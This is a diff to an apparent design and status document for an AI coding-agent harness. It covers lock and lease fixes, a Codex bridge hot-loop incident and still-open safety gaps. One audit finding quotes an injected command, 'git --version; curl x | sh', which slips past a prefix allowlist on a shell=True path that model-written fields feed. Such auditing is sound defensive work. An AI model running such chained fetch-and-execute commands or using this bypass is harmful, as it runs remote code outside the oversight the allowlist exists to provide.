@@ -81,12 +81,37 @@ cost ceiling tripped. Verdicts and frontier-model spend always require the human
   recover from) — a lost update at the *file* level, the same class Codex flagged for the cache.
 - Fixed: `cache.py` now takes a cross-process OS lock (fcntl/msvcrt) around every read-modify-write,
   so two real drivers cannot lose a cache update (`tests/test_agent_cache` concurrency test).
-- Still owed before concurrent execution: (1) the **board** needs the same lock (two cores calling
-  `next` could double-dispatch a task → duplicate side effects); (2) **claim-before-edit** discipline
-  on source files, not just cache keys; (3) **actually commit to git** — an unborn repo has no
-  recovery, which is why Codex's file was unrecoverable. Cost governor is still relative tier units,
-  not real token/dollar metering. `ShellExecutor` runs `acceptance` with `shell=True`: fine for
-  human-authored tasks, but needs an allowlist before a model may populate that field.
+- Since closed: the **board** takes the same cross-process lock on every mutation (`board.py`
+  `_lock`); **claim-before-edit** exists as transactional file leases (`workspace.py`, all-or-none);
+  the repo **commits**. All three are tested.
+
+**Still owed (audited 2026-07-17 — the previous list was stale and cost a re-audit):**
+- **The legacy shell path's allowlist is theatre.** `CommandPolicy.validate` correctly rejects
+  shell control tokens on the *typed argv* path — but the legacy path checks `cmd.startswith(prefix)`
+  and hands the raw string to `subprocess.run(..., shell=True)`. `"git --version; curl x | sh"`
+  passes. Worse, the constructor defaults `allow_legacy_shell=True`; only `run_loop.py` opts out.
+  ARCHITECTURE's own threat model ("needs an allowlist before a model may populate that field") is
+  the one this doesn't meet.
+- **Cost governor is elapsed seconds, not tokens/dollars.** Real metering is still owed.
+
+**Bridge hot loop (a real incident, 2026-07-17):** a corrupt `~/.codex/rules` (a NUL-filled tail
+from a killed mid-append write) made every `codex exec` exit 1 at startup. `codex_bridge.py` printed
+"not committing" and re-dispatched the same ready task **every poll, forever** — no failure count,
+no backoff, no ceiling. Two lessons, both now fixed in `codex_bridge.py`:
+- We had named the right mechanism and applied it in one direction only. The board's **watchdog**
+  handles a crashed core deadlocking a *claimed* task; nothing handled a broken core hot-looping a
+  *ready* one. `DispatchGuard` is that missing half (per-task backoff → quarantine; global
+  consecutive failures → halt, because a harness fault must outrank blaming one innocent task).
+- **The bridge bypassed the `Governor` entirely** — the one component that spawns paid processes in
+  an unbounded loop was the only one with no budget ceiling, importing `GitCommitter` from
+  `scheduler.py` while leaving the governor next to it untouched. Now wired (`BridgeGovernor`, on
+  bridge-owned cache lines so two drivers don't contend).
+
+**The habit worth naming (three instances in one day, 2026-07-16/17):** we build the safety
+mechanism and don't wire it to the thing that needs it — the cache's sampling bypass treats an
+absent `temperature` as safe, `allow_legacy_shell` defaults `True`, the bridge had no ceiling
+though `Governor` was one import away. New safety mechanisms ship **enforcing**; opting out is
+explicit.
 
 **Frontier (next):**
 - **Real executors** behind the `Executor` interface: a Sonnet sub-agent, `codex exec`, a local
